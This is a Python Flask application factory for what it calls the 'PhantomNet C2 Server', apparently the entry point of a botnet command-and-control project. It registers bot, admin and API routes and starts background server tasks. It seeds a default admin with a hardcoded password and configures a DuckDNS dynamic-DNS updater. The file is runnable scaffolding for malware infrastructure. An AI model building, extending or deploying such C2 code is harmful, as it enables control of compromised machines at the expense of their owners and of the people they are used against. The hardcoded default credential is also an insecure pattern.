"""
Main Flask application for PhantomNet C2 Server
"""

import logging
from flask import Flask

from .config import get_config
from .models import db
from .server import PhantomC2Server
from .routes.admin import admin_bp
from .routes.bot import bot_bp
from .routes.api import api_bp

def create_app(config_name=None):
    """Application factory pattern"""
    app = Flask(__name__)

    # Load configuration
    config_class = get_config(config_name)
    app.config.from_object(config_class)

    # Initialize extensions
    db.init_app(app)

    # Register blueprints
    app.register_blueprint(admin_bp)
    app.register_blueprint(bot_bp)
    app.register_blueprint(api_bp)

    # Configure logging
    logging.basicConfig(
        level=getattr(logging, app.config['LOG_LEVEL']),
        format=app.config['LOG_FORMAT'],
        handlers=[
            logging.FileHandler(app.config['LOG_FILE']),
            logging.StreamHandler()
        ]
    )

    # Create database tables
    with app.app_context():
        db.create_all()

        # Initialize default data
        _initialize_default_data()

    # Initialize server instance
    server = PhantomC2Server(
        host=app.config['HOST'],
        port=app.config['PORT']
    )

    # Store server instance in app context
    app.server = server

    # Start background tasks
    server.start_background_tasks()

    return app

def _initialize_default_data():
    """Initialize default data in database"""
    from .models import Admin, DuckDNSUpdater
    from werkzeug.security import generate_password_hash

    # Create default admin if not exists
    if not Admin.query.filter_by(username='admin').first():
        admin = Admin(
            username='admin',
            password_hash=generate_password_hash('phantom_admin_2024'),
            email='admin@phantomnet.com'
        )
        db.session.add(admin)
        db.session.commit()

    # Initialize DuckDNS configuration
    if not DuckDNSUpdater.query.first():
        duckdns = DuckDNSUpdater(
            domain='your-domain',
            token='your-token',
            is_active=False
        )
        db.session.add(duckdns)
        db.session.commit()

# Create default app instance
app = create_app()

if __name__ == '__main__':
    app.run(
        host=app.config['HOST'],
        port=app.config['PORT'],
        ssl_context=app.config['SSL_CONTEXT'],
        threaded=True,
        debug=app.config['DEBUG']
    )
